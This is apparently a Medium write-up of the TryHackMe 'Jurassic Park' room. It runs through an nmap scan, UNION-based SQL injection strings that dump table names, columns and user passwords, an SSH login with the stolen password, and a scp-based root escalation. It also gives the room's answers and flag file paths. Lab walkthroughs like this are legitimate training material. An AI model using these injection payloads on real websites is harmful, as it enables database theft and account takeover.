---
title: "Jurassic Park Tryhackme writeup fb2b53c4b202"
platform: Medium
original_file: 2024-09-01_Jurassic-Park-Tryhackme-writeup-fb2b53c4b202.md
---

# Jurassic Park Tryhackme writeup fb2b53c4b202

::: {}
# Jurassic Park Tryhackme writeup {#jurassic-park-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
https://tryhackme.com/room/jurassicpark
:::

::::::: {.section .e-content field="body"}
:::::: {#b45d .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Jurassic Park Tryhackme writeup {#6d9c .graf .graf--h3 .graf--leading .graf--title name="6d9c"}

<figure id="2cd8" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*MYSl_2dN9pxsuS8d.png"
class="graf-image" data-image-id="0*MYSl_2dN9pxsuS8d.png"
data-width="528" data-height="228" data-is-featured="true" />
</figure>

[https://tryhackme.com/room/jurassicpark](https://tryhackme.com/room/jurassicpark){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/jurassicpark"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="1c12" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*0rKHI9GWuMwcv9y3.png"
class="graf-image" data-image-id="0*0rKHI9GWuMwcv9y3.png"
data-width="875" data-height="676" />
</figure>

**Room link:**
[https://tryhackme.com/room/jurassicpark](https://tryhackme.com/room/jurassicpark){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/jurassicpark"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is for Premium Members Only. who purchased THM premium
membership.**

Alright, enough of BS. Time to get our work done. Similar to Rick and
Morty room, this Jurassic room does involve with SQL injection. I got a
hard time solving this room but thanks to user Darkstar, I am able to
complete this room. Let's get started, shall we?

### Task .1 {#e587 .graf .graf--h3 .graf-after--p name="e587"}

``` {#dbd4 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
nmap -sV 10.10.124.130
```

<figure id="8798" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*516z3XCb9rFnJQBq.png"
class="graf-image" data-image-id="0*516z3XCb9rFnJQBq.png"
data-width="712" data-height="298" />
</figure>

We found 2 open ports in the Nmap result which is Port 22 (SSH) and Port
80 (Http). Let's check with port 80 first.

<figure id="61d7" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*BZwrcTtxPV3fNwR7.png"
class="graf-image" data-image-id="0*BZwrcTtxPV3fNwR7.png"
data-width="875" data-height="503" />
</figure>

Let's Visit Online shop

<figure id="4c9e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*obuOMTt22LW9gzms.png"
class="graf-image" data-image-id="0*obuOMTt22LW9gzms.png"
data-width="875" data-height="606" />
</figure>

<figure id="f254" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*I_8aVwy6zZ6spaWn.png"
class="graf-image" data-image-id="0*I_8aVwy6zZ6spaWn.png"
data-width="875" data-height="479" />
</figure>

Look like we can do something on the URL field. How about the basic SQL
injection?

I am going to change the parameter ?id= from 0 to 5 and see what other
pages it brings up.

?id=0 --- No results found

?id=1 --- Gold package

?id=2 --- Bronze package

?id=3 --- Basic package

?id=4 --- No results found

?id=5 --- Development package (Interesting)

<figure id="c8ae" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*3vfcweBJh_tWrS1H.png"
class="graf-image" data-image-id="0*3vfcweBJh_tWrS1H.png"
data-width="875" data-height="511" />
</figure>

Look like we have user **Dennis** and we still have a chance on
performing the SQLi but not with the filtered character and text. This
time, we are going to use UNION. For your information, A UNION SQLi
exploitation requires a small brute-force on the number of columns
field. After a short investigation, we can perform the attack using five
columns.

<figure id="145e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*7t-NLrOD6mapvFMW.png"
class="graf-image" data-image-id="0*7t-NLrOD6mapvFMW.png"
data-width="700" data-height="633" />
</figure>

Now you can the vulnerable column is 2,4,5 so we can fetch the
information using these three columns

<figure id="38cf" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*kCK2_LqFjcbW1zL1.png"
class="graf-image" data-image-id="0*kCK2_LqFjcbW1zL1.png"
data-width="738" data-height="624" />
</figure>

**Question 1**. What is the SQL database called which is serving the
shop information?

``` {#7e45 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
park
```

**Question 2.** How many columns does the table have?

``` {#ae3b .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
5
```

**Question 3.** Whats the system *version*?

``` {#32e2 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
ubuntu 16.04
```

To fetch the tables from the database we can use query

``` {#7580 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
?id=1 union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema = database()
```

<figure id="fb0c" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*-iLL5Kg5DO50YdD6.png"
class="graf-image" data-image-id="0*-iLL5Kg5DO50YdD6.png"
data-width="779" data-height="674" />
</figure>

We can see that we have two tables **items** and **users.**

Now fetch users table information from database

``` {#2ec1 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
?id=1 union select 1,2,3,group_concat(column_name),5  from information_schema.columns where table_schema = database() and  table_name = "users"
```

<figure id="bda4" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*my_JRx7nD4elCxca.png"
class="graf-image" data-image-id="0*my_JRx7nD4elCxca.png"
data-width="769" data-height="674" />
</figure>

We know already username is dennis. So its time to fetch password

``` {#0d19 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
?id=5 union select 1,2,3,password,5 from users
```

<figure id="2c97" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*jv3ZAiKywFG4fCi7.png"
class="graf-image" data-image-id="0*jv3ZAiKywFG4fCi7.png"
data-width="754" data-height="680" />
</figure>

So its Time to Get SSH on port 22

``` {#e606 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
ssh dennis@10.10.124.130
```

<figure id="3fee" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*zC1ZOR3OmIyhoRgC.png"
class="graf-image" data-image-id="0*zC1ZOR3OmIyhoRgC.png"
data-width="592" data-height="644" />
</figure>

### Flag 1. {#0b40 .graf .graf--h3 .graf-after--figure name="0b40"}

Locate and get the first flag contents.

<figure id="7e5b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*LEEn3UKymDksPZ-M.png"
class="graf-image" data-image-id="0*LEEn3UKymDksPZ-M.png"
data-width="663" data-height="198" />
</figure>

**Flag 2.**

check the content of .viminfo file

<figure id="b776" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*26MtUEZRi155zzRO.png"
class="graf-image" data-image-id="0*26MtUEZRi155zzRO.png"
data-width="480" data-height="592" />
</figure>

``` {#f7dc .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
cat /boot/grub/fonts/flagTwo.txt
```

### Flag 3. {#dacb .graf .graf--h3 .graf-after--pre name="dacb"}

<figure id="e130" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*zKtlfW5Y8LREUzBQ.png"
class="graf-image" data-image-id="0*zKtlfW5Y8LREUzBQ.png"
data-width="626" data-height="386" />
</figure>

### Flag .4 {#f1ff .graf .graf--h3 .graf-after--figure name="f1ff"}

``` {#6384 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="csharp"}
There is no 4th flag
```

### Flag .5 {#e2f0 .graf .graf--h3 .graf-after--pre name="e2f0"}

Here we guess 5th flag can access only root user so its time to became
root

<figure id="e04d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Mdgwy5jn9o4yTknZ.png"
class="graf-image" data-image-id="0*Mdgwy5jn9o4yTknZ.png"
data-width="495" data-height="183" />
</figure>

An SCP huh. Let's check the [SCP variable in
GTFObin](https://gtfobins.github.io/gtfobins/scp/){.markup--anchor
.markup--p-anchor data-href="https://gtfobins.github.io/gtfobins/scp/"
rel="noopener ugc nofollow noopener" target="_blank"}.

<figure id="a78b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*EIoB76DoFsgrvE93.png"
class="graf-image" data-image-id="0*EIoB76DoFsgrvE93.png"
data-width="875" data-height="222" />
</figure>

Copy the line and escalate the privilege.

<figure id="e771" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*itM70He0djyFnLvE.png"
class="graf-image" data-image-id="0*itM70He0djyFnLvE.png"
data-width="739" data-height="421" />
</figure>

### Promote and Collaborate on Cybersecurity Insights {#4bab .graf .graf--h3 .graf-after--figure name="4bab"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#7200 .graf .graf--h3 .graf-after--p name="7200"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [September 1, 2024](https://medium.com/p/fb2b53c4b202).

[Canonical
link](https://medium.com/@bevijaygupta/jurassic-park-tryhackme-writeup-fb2b53c4b202){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
